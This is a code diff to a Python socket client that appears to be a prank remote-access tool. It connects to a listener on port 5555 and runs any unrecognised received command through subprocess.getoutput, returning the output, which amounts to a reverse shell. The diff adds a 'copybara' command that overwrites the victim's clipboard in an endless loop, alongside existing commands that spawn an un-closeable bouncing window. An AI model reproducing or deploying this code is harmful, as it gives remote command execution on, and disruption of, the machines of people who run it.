@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import threading
+import pyperclip
 import time
 import tkinter as tk
 from PIL import Image, ImageTk
@@ -11,29 +12,31 @@ def connect():
     s.connect(("127.0.0.1", 5555))
     failsafe = 0
     while failsafe < 20:
-        command = s.recv(1024).decode()
-        print(command)
+        command = s.recv(4096).decode()
         if command == "info":
-            s.send("copybarav2 help gort bounce command3".encode("utf-8"))
+            s.send("copybarav2 help gort bounce copybara".encode("utf-8"))
         elif command == "help":
-            help_text = """Available commands:\n"
-					  help - Display this help message\n"
-					  gort - Summons Gort 1\n
-					  bounce - makes an un-closeable bouncing rodent 2\n
-					  command3 - Description of command 3\n"""
-            print("sending help")
-            s.send(help_text.encode())   
+            help_text = """Available commands:\n
+					  help - Display this help message\n
+					  gort - Summons Gort \n
+					  bounce - Makes an un-closeable bouncing rodent \n
+					  copybara - Permenantly render the clipboard unusable"""
+            s.send(help_text.encode("utf-8"))   
         elif command == "gort":
             gthread = threading.Thread(target=window)
             gthread.start()
-            s.send("GORT IS HERE".encode())
+            s.send("GORT IS HERE".encode("utf-8"))
         elif command == "bounce":
             bthread = threading.Thread(target=bounce)
             bthread.start()
-            s.send("Triggered Bounce".encode())
+            s.send("Triggered Bounce".encode("utf-8"))
+        elif command == "copybara":
+            cthread = threading.Thread(target=clipboard)
+            cthread.start()
+            s.send("Coconut Doggo".encode("utf-8"))
         else:
             output = subprocess.getoutput(command)
-            s.send(output.encode())
+            s.send(output.encode("utf-8"))
         if command == "":
             failsafe += 1
         else:
@@ -84,6 +87,11 @@ def bounce():
         box.after(20, move)  # schedule next frame
     move()
     box.mainloop()
+
+def clipboard():
+    while True:
+        pyperclip.copy("Capybara? Capybara! Coconut Doggo!")
+        time.sleep(0.1)
 
 if __name__ == "__main__":
     while True:
